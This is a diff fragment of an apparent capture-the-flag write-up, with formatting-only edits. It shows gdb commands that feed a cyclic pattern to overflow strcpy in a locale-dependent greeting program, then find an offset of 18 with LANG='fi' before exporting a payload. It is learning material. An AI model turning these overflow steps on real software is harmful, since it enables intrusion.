@@ -43,7 +43,7 @@ You can view the asm code translated to C [here](source.c)
 
 #### Steps
 
-- Find overflow offset of strcpy:
+- Find overflow offset of strcpy:  
 --> with LANG="**en**"  
 ```
 (gdb) run $(python -c "print '\x90' * 40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
@@ -53,7 +53,7 @@ Hello 0123456789012345678901234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
 Program received signal SIGSEGV, Segmentation fault.
 0x08006241 in ?? ()
 ```
---> no offset found
+-> no offset found  
 
 --> with LANG="**fi**"  
 ```
@@ -64,8 +64,8 @@ Hyvää päivää 0123456789012345678901234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa6A
 Program received signal SIGSEGV, Segmentation fault.
 0x41366141 in ?? ()
 ```  
---> **offset is at 18**
--> We can use LANG="fi" to overflow strcpy:
+--> **offset is at 18**  
+> We can use LANG="fi" to overflow strcpy:
 
 - Export our payload to the LANG env variable  
 ```
